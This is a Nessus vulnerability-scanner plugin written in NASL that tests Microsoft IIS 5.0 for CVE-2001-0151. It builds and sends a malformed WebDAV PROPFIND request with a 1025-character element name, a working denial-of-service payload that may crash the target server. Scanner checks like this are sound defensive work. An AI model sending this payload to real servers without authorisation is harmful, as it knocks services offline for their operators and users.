#
# This script is based on Georgi Guninski's perl script
# ported to NASL by John Lampe <j_lampe@bellsouth.net>
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10667);
 script_version ("$Revision: 1.35 $");
 script_cve_id("CVE-2001-0151");
 script_bugtraq_id(2453);
 script_xref(name:"OSVDB", value:"1770");

 script_name(english: "Microsoft IIS 5.0 WebDAV Malformed PROPFIND Request Remote DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote version of the IIS web server contains a bug in its
implementation of the WebDAV protocol which may allow an attacker to
temporarily disable this service remotely. 

To exploit this flaw, an attacker would require the ability to
send a malformed PROPFIND request to the remote host, although
this would not in turn necessarily require authentication." );
 script_set_attribute(attribute:"solution", value:
"http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english: "Attempts to crash the Microsoft IIS server");
 script_category(ACT_ATTACK); 
 script_copyright(english:"This script is Copyright (C) 2001-2009 John Lampe");
 script_family(english: "Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if (! sig ) sig = get_http_banner(port:port);
if ( sig && "IIS/5" >!< sig ) exit(0);

if (! get_port_state(port)) exit(0);

req = 'OPTIONS / HTTP/1.0\r\n\r\n';
soc = open_sock_tcp(port);
if (! soc )exit(0); 	 

send(socket:soc, data:req); 	 
r = http_recv(socket:soc); 	 
close(soc); 	 
if (! r ) exit(0); 	 
if (!egrep(pattern:"^Allow:.*PROPFIND", string:r) ) exit(0);

quote = raw_string(0x22);
xml = strcat('<?xml version="1.0"?><a:propfind xmlns:a="DAV:" xmlns:u=":dav">',
    '<a:prop><a:displayname /><u:', crap(1025),
    ' /></a:prop></a:propfind>\r\n\r\n' );
l = strlen(xml); 	 
req = string ("PROPFIND / HTTP/1.1\r\n",
  "Content-type: text/xml\r\n",
  "Host: ", get_host_name() , "\r\n",
  "Content-length: ", l, "\r\n\r\n", xml, "\r\n\r\n\r\n");


soc = http_open_socket(port);
if(! soc ) exit(0);

send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);
if ( r =~ "HTTP/[0-9.]+ 207 " ) security_warning(port);
